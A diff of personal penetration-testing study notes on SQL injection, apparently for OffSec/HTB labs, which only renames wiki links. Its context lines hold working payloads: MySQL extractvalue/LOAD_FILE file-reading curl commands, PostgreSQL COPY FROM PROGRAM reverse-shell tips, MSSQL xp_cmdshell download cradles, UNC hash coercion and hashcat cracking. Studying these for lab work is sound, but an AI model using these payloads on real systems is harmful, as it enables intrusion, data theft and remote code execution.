@@ -19,7 +19,7 @@ use <database>;
 show tables;
 SELECT user, plugin, authentication_string FROM mysql.user WHERE user = '<user>';
 ```
-See [[SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]].
+See [[10. SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]].
 
 #### Tags: #MySQL
 
@@ -67,7 +67,7 @@ curl -s -b /tmp/cookies.txt -X POST http://<target>/login.aspx \
 ```
 *Full quoting breakdown (T-SQL → cmd.exe → PowerShell, three nested layers): [[SQL Injection (Breakdowns)#Triple-nested quoting for xp_cmdshell → cmd.exe → PowerShell download cradle|Command Breakdowns]].*
 
-See [[SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]], [[SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]], [[SQL Injection Attacks#Capstone: Exercise VM #4|Capstone Labs, VM #4]] (ASP.NET WebForms + blind stacked-query RCE end to end).
+See [[10. SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]], [[10. SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]], [[10. SQL Injection Attacks#Capstone: Exercise VM #4|Capstone Labs, VM #4]] (ASP.NET WebForms + blind stacked-query RCE end to end).
 
 #### Tags: #MSSQL #ImpacketMSSQLClient #XpCmdshell #ASPNETWebForms #StackedQueries
 
@@ -98,7 +98,7 @@ Every statement needs `go` on its own line to execute:
 2> go
 ```
 
-🔁 [[Attacking Common Services (HTB Supplementary)#CS.3. sqlcmd|CS.3]], [[Attacking Common Services (HTB Supplementary)#CS.4. MSSQL Database and Table Enumeration|CS.4]]
+🔁 [[06. Information Gathering|CS.3]], [[06. Information Gathering|CS.4]]
 
 #### Tags: #MSSQL #sqlcmd #LinuxClient #WindowsAuth
 
@@ -120,7 +120,7 @@ echo "MSSQLSVC::..." > hash.txt
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-🔁 [[Attacking Common Services (HTB Supplementary)#CS.2. MSSQL UNC Path Injection|CS.2]], [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]]
+🔁 [[06. Information Gathering|CS.2]], [[16. Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]]
 
 #### Tags: #MSSQL #xpDirtree #UNCInjection #NetNTLMv2 #HashCoercion
 
@@ -147,7 +147,7 @@ REVERT
 go
 ```
 
-🔁 [[Attacking Common Services (HTB Supplementary)#CS.5. MSSQL Impersonation|CS.5]]
+🔁 [[06. Information Gathering|CS.5]]
 
 #### Tags: #MSSQL #Impersonation #ExecuteAsLogin #PrivEsc
 
@@ -175,7 +175,7 @@ go
 
 Nested quote escaping: `''` inside an EXECUTE string = one escaped single quote. Two levels of nesting need two levels of `''`.
 
-🔁 [[Attacking Common Services (HTB Supplementary)#CS.6. MSSQL Linked Server Attacks|CS.6]]
+🔁 [[06. Information Gathering|CS.6]]
 
 #### Tags: #MSSQL #LinkedServer #sysservers #ExecuteAt #xpCmdshell #LateralMovement
 
@@ -222,7 +222,7 @@ curl -s -X POST --data "field=x%' UNION SELECT NULL,CAST((SELECT string_agg(cmd_
 ```
 *Base64-encode any reverse shell before dropping it into `COPY FROM PROGRAM`, and send it via `--data-urlencode` (not plain `--data`), base64 output routinely contains `+`, which `curl --data` sends raw and gets silently reinterpreted as a space by the receiving server.*
 
-See [[SQL Injection Attacks#Capstone: Exercise VM #3|Capstone Labs, VM #3]] for the full worked walkthrough, and [[SQL Injection (Breakdowns)#PostgreSQL error-based extraction via CAST() type-mismatch|Command Breakdowns]] for why each piece works.
+See [[10. SQL Injection Attacks#Capstone: Exercise VM #3|Capstone Labs, VM #3]] for the full worked walkthrough, and [[SQL Injection (Breakdowns)#PostgreSQL error-based extraction via CAST() type-mismatch|Command Breakdowns]] for why each piece works.
 
 #### Tags: #PostgreSQL #ErrorBasedSQLi #StackedQueries #RCE
 
@@ -287,7 +287,7 @@ offsec' OR 1=1 -- //
 ```
 *`extractvalue()`/`updatexml()` both truncate their output to 32 characters (including the `~` marker), so long values need paging through with `substring(value, start, 31)`, incrementing `start` by 31 each time.*
 
-> **Gotcha:** `INTO OUTFILE` throws `File already exists` if a file is already sitting at that exact path, MySQL will never overwrite one. Just change the filename (e.g. `shell2.php`) and re-run. See [[SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]] for a worked example.
+> **Gotcha:** `INTO OUTFILE` throws `File already exists` if a file is already sitting at that exact path, MySQL will never overwrite one. Just change the filename (e.g. `shell2.php`) and re-run. See [[10. SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]] for a worked example.
 
 **Full `curl` one-liners for a POST-based error-based extraction** (no sqlmap, manual only, one field goes straight into an `INSERT`):
 ```bash
@@ -315,9 +315,9 @@ curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT @
 curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),1,31)))-- -" http://<target>/index.php | grep -i "XPATH"
 curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),32,31)))-- -" http://<target>/index.php | grep -i "XPATH"
 ```
-*Swap `mail-list`/`index.php` for whatever field/page the target form actually uses (check the `<form method="...">` and `name="..."` attributes first, same lookup as [[SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2's Step 0]]). The `grep -i "XPATH"` just filters the huge HTML response down to the one line containing the leaked error.*
+*Swap `mail-list`/`index.php` for whatever field/page the target form actually uses (check the `<form method="...">` and `name="..."` attributes first, same lookup as [[10. SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2's Step 0]]). The `grep -i "XPATH"` just filters the huge HTML response down to the one line containing the leaked error.*
 
-See [[SQL Injection Attacks#10.2. Manual SQL Exploitation|10.2]], [[SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]], [[SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (VM #2, `extractvalue` + `LOAD_FILE` end to end, no sqlmap).
+See [[10. SQL Injection Attacks#10.2. Manual SQL Exploitation|10.2]], [[10. SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]], [[10. SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (VM #2, `extractvalue` + `LOAD_FILE` end to end, no sqlmap).
 
 > 🔍 Don't just copy these, understand why each fragment is there: [[SQL Injection (Breakdowns)|full command breakdowns]] for the `extractvalue()` one-liners above.
 
@@ -351,7 +351,7 @@ sqlmap -u "http://<target>/wp-admin/admin-ajax.php?action=<name>&id=1" -p id --b
 
 *Bonus: if a dumped column looks like password hashes, sqlmap offers to crack them on the spot with its bundled wordlist, no separate hashcat/john step needed for weak/common passwords.*
 
-See [[SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2]] and [[SQL Injection Attacks#🏆 Capstone Labs|the Capstone Labs section]] for the WordPress AJAX example.
+See [[10. SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2]] and [[10. SQL Injection Attacks#🏆 Capstone Labs|the Capstone Labs section]] for the WordPress AJAX example.
 
 ### Sqlmap — Advanced Injection Points
 
